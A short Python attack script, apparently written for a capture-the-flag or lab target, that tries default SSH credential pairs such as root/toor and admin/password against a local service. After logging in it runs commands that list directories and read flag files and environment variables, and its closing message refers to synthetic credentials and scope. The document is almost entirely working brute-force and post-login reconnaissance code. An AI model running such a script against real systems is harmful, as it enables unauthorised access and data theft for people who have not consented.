import paramiko
host, port = "127.0.0.1", 2222

def connect():
    t = paramiko.Transport((host, port))
    t.banner_timeout = 3
    t.start_client(timeout=3)
    return t

pairs = [("user","user"),("guest","guest"),("admin","password"),
         ("root","toor"),("dev","dev"),("labuser","labpass")]

success = False
for u, p in pairs:
    try:
        t = connect()
        try:
            t.auth_password(u, p, fallback=False)
            print("LOGIN_SUCCESS:", u, "/", p)
            success = True
            for cmd in ["id", "ls -la / /home 2>/dev/null",
                        "cat /flag* /home/*/flag* /root/flag* 2>/dev/null; env | grep -i flag"]:
                try:
                    ch = t.open_session(timeout=3)
                    ch.exec_command(cmd)
                    out = b""
                    while True:
                        if ch.recv_ready():
                            out += ch.recv(8192)
                        elif ch.exit_status_ready() and not ch.recv_ready():
                            break
                    print(f"--- [{cmd}] ---")
                    print(out.decode(errors="replace").strip() or "(no output)")
                    ch.close()
                except Exception as e:
                    print("CMD_ERR:", type(e).__name__, str(e)[:80])
            t.close()
            break
        except paramiko.AuthenticationException:
            print("LOGIN_FAIL:", u)
        except Exception as e:
            print("LOGIN_ERR:", u, type(e).__name__, str(e)[:80])
        t.close()
    except Exception as e:
        print("CONN_ERR:", u, type(e).__name__, str(e)[:80])

if not success:
    print("RESULT: all synthetic credentials rejected; stopping without login (acceptable per scope).")
EOF

